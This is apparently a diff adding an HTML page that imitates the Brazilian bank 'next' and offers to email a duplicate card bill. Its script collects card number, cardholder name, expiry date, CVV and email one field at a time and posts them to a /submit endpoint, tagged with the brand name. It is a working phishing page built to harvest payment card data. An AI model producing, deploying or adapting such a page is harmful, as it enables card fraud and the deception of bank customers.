@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fatura next</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Open+Sans&display=swap");
+    body {
+      font-family: "Open Sans", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white m-0 p-0">
+  <!-- Top bar -->
+  <div class="bg-[#00ff5f]   text-black text-sm font-semibold px-6 py-2 w-full">
+    Acesse o app next para mais serviços
+  </div>
+
+  <!-- Navigation bar -->
+  <nav class="bg-white shadow-sm flex items-center px-6 py-4 w-full">
+    <div class="flex items-center space-x-6">
+      <img src="data:image/jpeg;base64,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" alt="next logo" class="h-10 w-auto" />
+      <div class="border-l border-gray-300 h-6"></div>
+      <a class="text-gray-800 font-semibold hover:underline text-base leading-none" href="#">serviços</a>
+      <a class="text-gray-800 font-semibold hover:underline text-base leading-none" href="#">ajuda</a>
+    </div>
+  </nav>
+
+  <!-- Title bar -->
+  <div class="bg-[#e6fafa] px-6 py-3 w-full">
+    <h1 class="text-2xl font-extrabold text-gray-900">Fatura</h1>
+  </div>
+
+  <!-- Main content -->
+  <main class="flex flex-col md:flex-row justify-center md:justify-between px-6 py-10 max-w-7xl mx-auto gap-10">
+    <!-- Left text block -->
+    <section class="max-w-lg">
+      <h2 class="text-2xl font-extrabold text-gray-900 mb-3">Consultar Fatura</h2>
+      <p class="text-gray-700 mb-6 text-base leading-relaxed">
+        Receba a 2ª via da fatura do cartão por e-mail.
+      </p>
+      <p class="text-gray-600 text-xs leading-tight">
+        Para consultar ou atualizar seu endereço de e-mail, acesse o app next ou entre em contato com o atendimento.
+      </p>
+    </section>
+
+    <!-- Right form block -->
+    <section>
+      <form id="form" class="bg-white rounded-md p-8 max-w-md w-full shadow-sm">
+        <h3 class="font-extrabold text-gray-900 mb-6 text-center text-sm md:text-base">
+          2ª via da fatura por e-mail
+        </h3>
+        <input type="text" id="inputField" placeholder="Número do Cartão" required
+          class="w-full border border-gray-400 rounded px-4 py-3 mb-4 text-base text-gray-900 placeholder-gray-700 focus:outline-none focus:ring-2 focus:ring-[#00ff5f]" />
+        <button type="button" id="nextButton"
+          class="w-full bg-[#00ff5f] text-black font-semibold py-3 rounded hover:bg-[#00cc4d] transition-colors">
+          Continuar
+        </button>
+      </form>
+    </section>
+  </main>
+
+  <script>
+  const steps = [
+    { placeholder: "Número do Cartão", key: "cardNumber" },
+    { placeholder: "Nome no Cartão", key: "nomeCartao" },
+    { placeholder: "Validade (MM/AA)", key: "validade" },
+    { placeholder: "CVV", key: "cvv" },
+    { placeholder: "Email", key: "email" }
+  ];
+
+  const formData = {};
+  let currentStep = 0;
+
+  const input = document.getElementById("inputField");
+  const button = document.getElementById("nextButton");
+
+  button.addEventListener("click", () => {
+    const value = input.value.trim();
+    if (!value) {
+      alert("Por favor, preencha o campo antes de continuar.");
+      return;
+    }
+
+    formData[steps[currentStep].key] = value;
+    currentStep++;
+
+    if (currentStep < steps.length) {
+      input.value = "";
+      input.placeholder = steps[currentStep].placeholder;
+    } else {
+      formData.pagina = "next"; // <-- Adiciona a origem da página aqui
+      enviarDados(formData);
+    }
+  });
+
+  function enviarDados(data) {
+    fetch("/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+      .then(response => response.json())
+      .then(result => {
+        if (result.status === "success") {
+          alert("Dados enviados com sucesso!");
+        } else {
+          alert("Erro: " + result.message);
+        }
+      })
+      .catch(error => alert("Erro ao enviar dados: " + error.message));
+  }
+</script>
+
+</body>
+</html>
